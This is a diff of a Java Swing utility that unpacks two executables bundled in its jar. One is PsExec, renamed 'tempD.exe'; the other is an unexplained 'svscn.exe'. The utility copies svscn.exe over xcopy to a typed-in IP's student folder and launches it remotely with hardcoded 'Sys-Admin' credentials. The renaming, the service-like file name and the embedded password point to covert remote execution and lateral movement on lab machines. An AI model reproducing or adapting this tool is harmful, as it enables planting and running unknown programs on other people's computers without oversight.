@@ -1,7 +1,12 @@
 
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.URL;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -36,6 +41,10 @@ public class Script extends javax.swing.JFrame {
         jButton1 = new javax.swing.JButton();
         jTextField1 = new javax.swing.JTextField();
         jLabel1 = new javax.swing.JLabel();
+        jScrollPane1 = new javax.swing.JScrollPane();
+        jTextArea1 = new javax.swing.JTextArea();
+        jButton2 = new javax.swing.JButton();
+        jButton3 = new javax.swing.JButton();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
 
@@ -47,6 +56,24 @@ public class Script extends javax.swing.JFrame {
         });
 
         jLabel1.setText("IP");
+
+        jTextArea1.setColumns(20);
+        jTextArea1.setRows(5);
+        jScrollPane1.setViewportView(jTextArea1);
+
+        jButton2.setText("Extract");
+        jButton2.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                jButton2ActionPerformed(evt);
+            }
+        });
+
+        jButton3.setText("Exe");
+        jButton3.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                jButton3ActionPerformed(evt);
+            }
+        });
 
         javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
         getContentPane().setLayout(layout);
@@ -60,9 +87,15 @@ public class Script extends javax.swing.JFrame {
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                         .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 157, javax.swing.GroupLayout.PREFERRED_SIZE))
                     .addGroup(layout.createSequentialGroup()
-                        .addGap(146, 146, 146)
-                        .addComponent(jButton1)))
-                .addContainerGap(192, Short.MAX_VALUE))
+                        .addGap(108, 108, 108)
+                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
+                        .addGap(90, 90, 90)
+                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
+                            .addComponent(jButton2)
+                            .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                                .addComponent(jButton3)
+                                .addComponent(jButton1)))))
+                .addContainerGap(71, Short.MAX_VALUE))
         );
         layout.setVerticalGroup(
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
@@ -71,42 +104,153 @@ public class Script extends javax.swing.JFrame {
                 .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                     .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                     .addComponent(jLabel1))
-                .addGap(18, 18, 18)
-                .addComponent(jButton1)
-                .addContainerGap(210, Short.MAX_VALUE))
+                .addGap(40, 40, 40)
+                .addComponent(jButton2)
+                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                    .addGroup(layout.createSequentialGroup()
+                        .addGap(18, 18, 18)
+                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
+                    .addGroup(layout.createSequentialGroup()
+                        .addGap(42, 42, 42)
+                        .addComponent(jButton1)
+                        .addGap(18, 18, 18)
+                        .addComponent(jButton3)))
+                .addContainerGap(112, Short.MAX_VALUE))
         );
 
         pack();
     }// </editor-fold>//GEN-END:initComponents
 
     private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
-        Runtime r = Runtime.getRuntime();
-      
-       String cmd = "C:/Users/Administrator/Desktop/New folder (2)/psexec.exe \\\\172.16.5.161 -u \"Sys-Admin\" -p c++ -d -i \"c:/users/student/documents/NEW.exe\"";
-       String ip = jTextField1.getText();
-       ip.trim();
-       String cpyCMD = "xcopy C:\\Users\\Administrator\\Desktop\\NEW.exe "
-               + "\\\\"
-               + ip
-               + "\\users\\student\\downloads\\ /y";
-       System.out.println(cmd);
-       ProcessBuilder ps = new ProcessBuilder("cmd","/c",cpyCMD);
-        try {
-            Process p = ps.start();
-            BufferedReader bs = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            while(true){
-            String l = bs.readLine();
-            if(l == null)
-                break;
-            System.out.println(l);
-            p.destroy();
+        try {                                         
+          
+            
+            String path = new File(".").getCanonicalPath();
+       //     path += "\\svscn.exe ";
+            System.out.println(path);
+            String ip = jTextField1.getText();
+            ip.trim();   
+            String cpyCMD = "xcopy "+path+"\\svscn.exe "
+                    + "\\\\"
+                    + ip
+                    + "\\users\\student\\documents\\svscn.exe /y";
+            System.out.println("Cop cmd "+cpyCMD);
+        /*    String cmd = "tempD "
+                    + "\\\\"
+                    + ip
+                    + " -u \"Sys-Admin\" -p c++ -d -i \"c:/users/student/documents/svscn.exe\"";
+            System.out.println("cmd "+cmd);*/
+        //    String test = "dir";        
+            ProcessBuilder ps = new ProcessBuilder("cmd","/c",cpyCMD);
+            ps.directory(new File(path));
+            try {
+                Process p = ps.start();
+                BufferedReader bs = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                while(true){
+                    String l = bs.readLine();
+                    if(l == null)
+                        break;
+                    System.out.println(l);
+                    jTextArea1.append(l);
+                }
+            } catch (IOException ex) {
+                Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
             }
+            
         } catch (IOException ex) {
             Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
         }
         
     }//GEN-LAST:event_jButton1ActionPerformed
 
+    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
+            fileE("svscn.exe","svscn.exe");
+            fileE("PsExec.exe","tempD.exe");       // TODO add your handling code here:
+    }//GEN-LAST:event_jButton2ActionPerformed
+
+    private void jButton3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton3ActionPerformed
+   try {                                         
+          
+          //  fileE("svscn.exe","svscn.exe");
+         //   fileE("PsExec.exe","tempD.exe");
+            String path = new File(".").getCanonicalPath();
+       //     path += "\\svscn.exe ";
+            System.out.println(path);
+            String ip = jTextField1.getText();
+            ip.trim();   
+            System.out.println(ip);
+          /*  String cpyCMD = "xcopy "+path+"\\svscn.exe "
+                    + "\\\\"
+                    + ip
+                    + "\\users\\student\\documents\\svscn.exe /y";*/
+         //   
+            String cmd = "tempD "
+                    + "\\\\"
+                    + ip
+                    + " -u \"Sys-Admin\" -p c++ -d -i \"c:/users/student/documents/svscn.exe\"";
+            System.out.println("cmd "+cmd);
+            String test = "dir";        
+            ProcessBuilder ps = new ProcessBuilder("cmd","/c",cmd);
+         //   System.out.println("Cop cmd "+cmd);
+            ps.directory(new File(path));
+            try {
+                Process p = ps.start();
+                BufferedReader bs = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                while(true){
+                    String l = bs.readLine();
+                    if(l == null)
+                        break;
+                    System.out.println(l);
+                    jTextArea1.append(l);
+                }
+            } catch (IOException ex) {
+                Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
+            }
+            
+        } catch (IOException ex) {
+            Logger.getLogger(Script.class.getName()).log(Level.SEVERE, null, ex);
+        }       
+        
+// TODO add your handling code here:
+    }//GEN-LAST:event_jButton3ActionPerformed
+private void fileE(String rs,String name){
+        
+    File file = null;
+    String resource = rs;
+    URL res = getClass().getResource(resource);
+        if (res.toString().startsWith("jar:")) {
+        try {
+            InputStream input = getClass().getResourceAsStream(resource);
+            file = new File(name);
+            OutputStream out = new FileOutputStream(file);
+            int read;
+            byte[] bytes = new byte[1024];
+
+            while ((read = input.read(bytes)) != -1) {
+                out.write(bytes, 0, read);
+                System.out.println("Writing");
+                jTextArea1.append("Weritng");
+            }
+        //    file.deleteOnExit();
+        out.close();
+      //  return true;
+        } catch (IOException ex) {
+           System.out.println("ex"+ex);
+// Exceptions.printStackTrace(ex);
+        }
+    } else {
+        //this will probably work in your IDE, but not from a JAR
+        file = new File(res.getFile());
+        System.out.println("This onetho");
+    }
+
+    if (file != null && !file.exists()) {
+       System.out.println("Not Found");
+        throw new RuntimeException("Error: File " + file + " not found!");
+    }     
+  //  return false;
+
+}
     /**
      * @param args the command line arguments
      */
@@ -144,7 +288,11 @@ public class Script extends javax.swing.JFrame {
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JButton jButton1;
+    private javax.swing.JButton jButton2;
+    private javax.swing.JButton jButton3;
     private javax.swing.JLabel jLabel1;
+    private javax.swing.JScrollPane jScrollPane1;
+    private javax.swing.JTextArea jTextArea1;
     private javax.swing.JTextField jTextField1;
     // End of variables declaration//GEN-END:variables
 }
